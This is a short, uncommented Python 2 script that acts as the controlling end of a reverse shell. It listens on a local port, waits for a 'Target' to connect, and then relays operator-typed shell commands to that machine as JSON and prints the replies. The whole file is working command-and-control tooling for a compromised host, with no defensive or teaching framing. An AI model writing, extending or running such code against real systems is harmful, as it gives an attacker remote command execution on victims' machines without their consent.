#!/usr/bin/python
import socket
import json

def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data)

def reliable_receive():
    json_data = ""
    while True:
        try:
            json_data = json_data + target.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue

def shell():
    while True:
        command = raw_input("* Shell#-%s: " % str(ip))
        reliable_send(command)
        if command == 'q':
            break
        else:
            result = reliable_receive()
            print(result)


def server():
    global s
    global ip
    global target
    s = socket.socket(socket. AF_INET, socket.SOCK_STREAM)
    s.setsockopt (socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind (("127.0.0.1",54321))
    s.listen(5)
    print("Listening for Incoming connections")
    target, ip = s.accept()
    print("Target Connected!")

server()
shell()
s.close()